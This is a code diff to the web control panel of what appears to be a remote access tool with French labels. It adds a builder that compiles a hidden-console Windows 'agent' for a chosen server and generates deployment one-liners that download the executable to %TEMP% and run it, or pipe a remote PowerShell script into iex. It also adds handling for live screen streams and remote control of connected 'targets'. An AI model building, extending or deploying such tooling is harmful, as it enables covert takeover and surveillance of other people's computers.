@@ -81,6 +81,143 @@
             margin-bottom: 6px;
         }
 
+        /* AGENT BUILDER */
+        .bld-box {
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--lnclr);
+            background: rgba(0, 0, 0, 0.22);
+            border-radius: 0;
+        }
+
+        .bld-hdr {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .inp-lbl {
+            font-size: 10px;
+            font-family: ui-monospace, monospace;
+            color: var(--lnclr);
+            opacity: 0.8;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+        }
+
+        .inp-row {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 6px;
+        }
+
+        .inp-row input {
+            flex: 1;
+            background: var(--mid);
+            border: 1px solid var(--lnclr);
+            color: var(--fg);
+            padding: 4px 6px;
+            font-family: ui-monospace, monospace;
+            font-size: 11px;
+            outline: none;
+        }
+
+        .inp-row input:focus {
+            border-color: var(--acc);
+            box-shadow: 0 0 4px rgba(151, 177, 170, 0.4);
+        }
+
+        .bld-opts {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 10px;
+            font-family: ui-monospace, monospace;
+            color: var(--fg);
+            margin-bottom: 8px;
+        }
+
+        .chk-lbl {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .chk-lbl input {
+            cursor: pointer;
+        }
+
+        .cmp-tag {
+            font-size: 9px;
+            color: var(--acc);
+            opacity: 0.85;
+            font-family: ui-monospace, monospace;
+        }
+
+        .bld-actions {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 6px;
+        }
+
+        .bld-btn-main {
+            flex: 1;
+            background: var(--mid);
+            color: var(--fg);
+            border: 1px solid var(--lnclr);
+            padding: 6px 4px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .bld-btn-main:hover:not(:disabled) {
+            background: var(--acc);
+            color: var(--mid);
+            border-color: var(--fg);
+        }
+
+        .bld-btn-dl {
+            background: var(--mid);
+            color: var(--fg);
+            border: 1px solid var(--lnclr);
+            padding: 6px 8px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .bld-btn-dl.ready {
+            background: var(--onl);
+            color: #0d1517;
+            border-color: #fff;
+            font-weight: 800;
+        }
+
+        .bld-st-box {
+            font-family: ui-monospace, monospace;
+            font-size: 10px;
+            padding: 4px 6px;
+            background: var(--mid);
+            border: 1px dashed var(--lnclr);
+            color: var(--lnclr);
+            opacity: 0.9;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .bld-st-box.ok {
+            color: var(--onl);
+            border-color: var(--onl);
+        }
+
+        .bld-st-box.err {
+            color: var(--dngr);
+            border-color: var(--dngr);
+        }
+
         /* DEPLOYMENT PANE */
         .dply-box {
             padding: 10px 12px;
@@ -298,6 +435,37 @@
             <div class="st-dot active" title="srv_st: onl"></div>
         </div>
 
+        <!-- AGENT BUILDER -->
+        <div class="bld-box">
+            <div class="bld-hdr" onclick="tgl_bld()">
+                <div class="sctn-lbl" style="margin-bottom:0;">BUILD_AGENT // COMPILATEUR</div>
+                <span id="bld-tgl-icon" style="font-size:10px; opacity:0.8;">[-]</span>
+            </div>
+            
+            <div id="bld-body">
+                <div class="inp-lbl" style="margin-top:6px;">SRV_HOST / DOMAIN:</div>
+                <div class="inp-row">
+                    <input type="text" id="bld-srv-inp" placeholder="domain.com or IP:port" spellcheck="false" oninput="on_srv_inp_change()" />
+                    <button id="btn-rst-host" onclick="rst_bld_host()" title="Utiliser le host actuel">[ CURR ]</button>
+                </div>
+
+                <div class="bld-opts">
+                    <label class="chk-lbl">
+                        <input type="checkbox" id="bld-opt-gui" checked />
+                        <span>HIDE_CONSOLE (GUI)</span>
+                    </label>
+                    <span id="bld-cmp-tag" class="cmp-tag">[ GO: ... ]</span>
+                </div>
+
+                <div class="bld-actions">
+                    <button id="btn-compile" class="bld-btn-main" onclick="start_compile()">[ ⚙ COMPILER AGENT ]</button>
+                    <button id="btn-dl-agent" class="bld-btn-dl" onclick="download_agent()">[ ⇩ DL EXE ]</button>
+                </div>
+
+                <div id="bld-status" class="bld-st-box">IDLE_READY</div>
+            </div>
+        </div>
+
         <!-- DEPLOYMENT CMD -->
         <div class="dply-box">
             <div class="sctn-lbl">DPLY_TGT</div>
@@ -350,16 +518,132 @@
         const btn_ctrl = document.getElementById('btn-ctrl');
         const cde_bx = document.getElementById('cde-bx');
         const disp_grp = document.getElementById('disp-grp');
+        const bld_srv_inp = document.getElementById('bld-srv-inp');
+        const bld_status = document.getElementById('bld-status');
+        const bld_cmp_tag = document.getElementById('bld-cmp-tag');
+        const btn_compile = document.getElementById('btn-compile');
+        const btn_dl_agent = document.getElementById('btn-dl-agent');
+        const bld_opt_gui = document.getElementById('bld-opt-gui');
+
+        function get_active_srv() {
+            let s = bld_srv_inp ? bld_srv_inp.value.trim() : '';
+            if (!s) s = hst;
+            s = s.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
+            return s || hst;
+        }
 
         function upd_cde() {
             const pr = window.location.protocol;
+            const targetSrv = get_active_srv();
             if (cur_tb === 'cmd') {
-                cde_bx.innerText = `curl -s -o %TEMP%\\agent.exe ${pr}//${hst}/dl/agent.exe && %TEMP%\\agent.exe -server ${hst}`;
+                cde_bx.innerText = `curl -s -o %TEMP%\\agent.exe ${pr}//${hst}/dl/agent.exe && %TEMP%\\agent.exe -server ${targetSrv}`;
             } else {
-                cde_bx.innerText = `irm ${pr}//${hst}/dl/run.ps1 | iex`;
+                cde_bx.innerText = `irm "${pr}//${hst}/dl/run.ps1?server=${encodeURIComponent(targetSrv)}" | iex`;
             }
         }
-        upd_cde();
+
+        function on_srv_inp_change() {
+            upd_cde();
+        }
+
+        function rst_bld_host() {
+            if (bld_srv_inp) {
+                bld_srv_inp.value = hst;
+                on_srv_inp_change();
+            }
+        }
+
+        function tgl_bld() {
+            const b = document.getElementById('bld-body');
+            const ico = document.getElementById('bld-tgl-icon');
+            if (b.style.display === 'none') {
+                b.style.display = 'block';
+                ico.innerText = '[-]';
+            } else {
+                b.style.display = 'none';
+                ico.innerText = '[+]';
+            }
+        }
+
+        async function init_builder() {
+            if (bld_srv_inp && !bld_srv_inp.value) {
+                bld_srv_inp.value = hst;
+            }
+            upd_cde();
+
+            try {
+                const res = await fetch('/api/compiler-info');
+                if (res.ok) {
+                    const info = await res.json();
+                    if (info.go_installed) {
+                        bld_cmp_tag.innerText = '[ GO: OK ]';
+                        bld_cmp_tag.title = info.go_version || 'Go installé';
+                        bld_cmp_tag.style.color = 'var(--onl)';
+                    } else {
+                        bld_cmp_tag.innerText = '[ GO: N/A ]';
+                        bld_cmp_tag.title = info.go_version || 'Go non détecté';
+                        bld_cmp_tag.style.color = 'var(--dngr)';
+                    }
+
+                    if (info.agent_exists) {
+                        const mb = (info.agent_size / (1024 * 1024)).toFixed(2);
+                        bld_status.innerText = `BINAIRE PRÊT (${mb} MB)`;
+                        btn_dl_agent.classList.add('ready');
+                    } else {
+                        bld_status.innerText = 'NON COMPILÉ';
+                    }
+                }
+            } catch (e) {
+                bld_cmp_tag.innerText = '[ GO: ERR ]';
+            }
+        }
+
+        async function start_compile() {
+            const targetSrv = get_active_srv();
+            const hideGui = bld_opt_gui ? bld_opt_gui.checked : true;
+
+            btn_compile.disabled = true;
+            btn_compile.innerText = '[ ⏳ COMPILATION... ]';
+            bld_status.className = 'bld-st-box';
+            bld_status.innerText = `COMPILATION POUR ${targetSrv}...`;
+
+            try {
+                const res = await fetch('/api/compile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        server: targetSrv,
+                        hide_console: hideGui,
+                        arch: 'amd64'
+                    })
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    const mb = (data.size / (1024 * 1024)).toFixed(2);
+                    bld_status.className = 'bld-st-box ok';
+                    bld_status.innerText = `✓ COMPILÉ (${mb} MB, ${data.duration_ms}ms)`;
+                    btn_dl_agent.classList.add('ready');
+                    upd_cde();
+                } else {
+                    bld_status.className = 'bld-st-box err';
+                    bld_status.innerText = `! ${data.error || 'Erreur inconnue'}`;
+                    if (data.output) console.error("Compiler output:", data.output);
+                }
+            } catch (err) {
+                bld_status.className = 'bld-st-box err';
+                bld_status.innerText = `! Erreur réseau: ${err.message}`;
+            } finally {
+                btn_compile.disabled = false;
+                btn_compile.innerText = '[ ⚙ COMPILER AGENT ]';
+            }
+        }
+
+        function download_agent() {
+            window.location.href = `/dl/agent.exe?t=${Date.now()}`;
+        }
+
+        init_builder();
 
         function swtch_tb(tb) {
             cur_tb = tb;
@@ -375,6 +659,23 @@
             setTimeout(() => { cde_bx.innerText = prv; }, 1000);
         }
 
+        function reset_active_stream(reason) {
+            cur_tgt_id = null;
+            if (ws_adm) {
+                try { ws_adm.close(); } catch(e) {}
+                ws_adm = null;
+            }
+            if (ctrl_on) {
+                tgl_ctrl();
+            }
+            st_txt.innerText = reason || 'NO_TGT_SLCTD';
+            plchldr.style.display = 'block';
+            plchldr.innerText = `[ ${reason || 'IDLE_WAITING_STREAM'} ]`;
+            ctx.clearRect(0, 0, cnvs.width, cnvs.height);
+            disp_grp.innerHTML = '';
+            document.querySelectorAll('.tgt-itm').forEach(el => el.classList.remove('active'));
+        }
+
         async function rfrsh_tgts() {
             try {
                 const res = await fetch('/api/agents');
@@ -382,11 +683,16 @@
                 const cntnr = document.getElementById('tgt-lst');
                 cntnr.innerHTML = '';
 
+                let activeFound = false;
+
                 if (lst.length === 0) {
                     cntnr.innerHTML = '<li style="padding:10px; color:var(--lnclr); font-size:11px; opacity:0.6; text-transform:uppercase;">[ NO_TGT_CONN ]</li>';
                 }
 
                 lst.forEach(a => {
+                    if (a.id === cur_tgt_id) {
+                        activeFound = true;
+                    }
                     const li = document.createElement('li');
                     li.className = 'tgt-itm' + (a.id === cur_tgt_id ? ' active' : '');
                     li.innerHTML = `
@@ -399,12 +705,17 @@
                     li.onclick = () => slct_tgt(a.id);
                     cntnr.appendChild(li);
                 });
+
+                // Si la machine sélectionnée n'est plus dans la liste connectée, réinitialiser immédiatement le flux
+                if (cur_tgt_id && !activeFound) {
+                    reset_active_stream(`MACHINE_HORS_LIGNE: ${cur_tgt_id}`);
+                }
             } catch (e) {
                 console.error(e);
             }
         }
 
-        setInterval(rfrsh_tgts, 3000);
+        setInterval(rfrsh_tgts, 1500);
         rfrsh_tgts();
 
         function slct_tgt(id) {
@@ -412,11 +723,14 @@
             cur_tgt_id = id;
             rfrsh_tgts();
 
-            if (ws_adm) ws_adm.close();
+            if (ws_adm) {
+                try { ws_adm.close(); } catch(e) {}
+            }
 
             st_txt.innerText = `CONN_REQ: ${id}`;
             plchldr.style.display = 'block';
             plchldr.innerText = '[ STREAM_SYNC... ]';
+            ctx.clearRect(0, 0, cnvs.width, cnvs.height);
 
             const prtcl = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             ws_adm = new WebSocket(`${prtcl}//${hst}/ws/admin?id=${id}`);
@@ -441,15 +755,17 @@
                         const msg = JSON.parse(evt.data);
                         if (msg.type === 'displays') {
                             render_disps(msg.displays);
+                        } else if (msg.type === 'target_disconnected') {
+                            reset_active_stream(`MACHINE_HORS_LIGNE: ${msg.agent_id}`);
                         }
                     } catch (e) {}
                 }
             };
 
             ws_adm.onclose = () => {
-                st_txt.innerText = `DISCONN: ${id}`;
-                plchldr.style.display = 'block';
-                plchldr.innerText = '[ TGT_LOST ]';
+                if (cur_tgt_id === id) {
+                    reset_active_stream(`CONN_FERMÉE: ${id}`);
+                }
             };
         }
 
